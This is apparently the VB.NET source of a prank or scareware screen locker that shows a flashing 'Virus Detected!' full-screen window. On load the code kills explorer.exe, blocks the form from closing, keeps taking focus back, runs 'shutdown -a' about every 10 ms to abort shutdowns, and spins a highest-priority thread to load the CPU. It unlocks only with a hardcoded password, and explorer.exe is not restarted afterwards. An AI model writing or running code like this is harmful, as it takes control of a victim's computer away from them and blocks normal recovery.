Imports System.Drawing.Size
Imports System.Windows.Forms

Public Class main
    Dim WithEvents timerlabel As New Windows.Forms.Timer With {.Enabled = True, .Interval = 800}
    Dim WithEvents timerbg As New Windows.Forms.Timer With {.Enabled = True, .Interval = 10}
    Dim pause As Boolean = False
    Dim labels As New List(Of Windows.Forms.Label)


    Private Sub main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Shell("taskkill /im explorer.exe /f")
        Me.ControlBox = False
        Me.Size = New Drawing.Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Size.Height)
        Me.StartPosition = Windows.Forms.FormStartPosition.CenterScreen
        LabelText.Location = New Drawing.Point((Me.Size.Width - LabelText.Size.Width) / 2, (Me.Size.Height - LabelText.Size.Height) / 2)
        BackgroundAnimation()
        Me.KeyPreview = True

        Me.TopMost = True
        Dim t As New Threading.Thread(AddressOf Auslasten) With {.IsBackground = True, .Priority = Threading.ThreadPriority.Highest}
        t.Start()
        Me.Focus()
        If Not Me.Focused Then
            MsgBox("not focused")
        End If
    End Sub

    Private Sub VisibleText() Handles timerlabel.Tick
        If LabelText.BackColor = Drawing.Color.Black Then
            LabelText.BackColor = Drawing.Color.White
            Me.BackColor = Drawing.Color.Black
        Else
            LabelText.BackColor = Drawing.Color.Black
            Me.BackColor = Drawing.Color.White
        End If


    End Sub

    Private Sub Background() Handles timerbg.Tick
        For Each l As Label In labels
            Dim posY As Integer = l.Location.Y + 10
            If posY > My.Computer.Screen.Bounds.Height Then
                posY = Rdm()
            End If
            l.Location = New Drawing.Point(l.Location.X, posY)

            l.BackColor = Me.BackColor
            l.Update()

        Next
        CancelShutdown()

    End Sub

    Private Sub SetFocus() Handles Me.Leave
        If Not pause Then
            Me.Focus()
        End If

    End Sub

    Private Sub main_FormClosing(sender As Object, e As Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If Not pause Then
            e.Cancel = True
        End If

    End Sub

    Private Sub EnterPwd() Handles LabelText.DoubleClick

        pause = True
        Me.TopMost = False
        Dim pwd As String = InputBox("Enter Password!", "Virus Detected!")
        pause = False
        Me.TopMost = True
        Me.Focus()

        If pwd = "hallo" Then
            Selfdestroy()

        End If
    End Sub

    Private Sub Selfdestroy()


        timerlabel.Stop()
        pause = True
        'Shell("explorer.exe")
        Me.Close()


    End Sub

    Private Sub BackgroundAnimation()

        Dim f As New Drawing.Font("Courier", 19, Drawing.FontStyle.Bold)




        For x = 0 To 100
            labels.Add(New Windows.Forms.Label)
            labels.Item(x).Text = CStr(Rdm(10))
            labels.Item(x).Location = New Drawing.Point(Rdm, Rdm)
            labels.Item(x).Font = f
            labels.Item(x).ForeColor = Drawing.Color.White
            labels.Item(x).Size = New Drawing.Size(30, 30)
            labels.Item(x).Parent = Me
            Me.Update()
        Next



    End Sub

    Private Function Rdm(Optional max As Integer = 2000) As Integer
        Dim a As Integer = Rnd() * max
        Return a

    End Function

  
    Private Sub CancelShutdown()
        Shell("shutdown -a")
    End Sub

    Private Sub Auslasten()
        Dim a As Long
        While True
            a = a + 1
            Math.Pow(a, a)
        End While
    End Sub

    Private Sub PreventActions() Handles MyBase.KeyDown
        My.Computer.Keyboard.SendKeys(Windows.Forms.Keys.LWin.ToString)
        MsgBox("Sent key")
    End Sub

    Private Sub MakeFolders()


    End Sub


End Class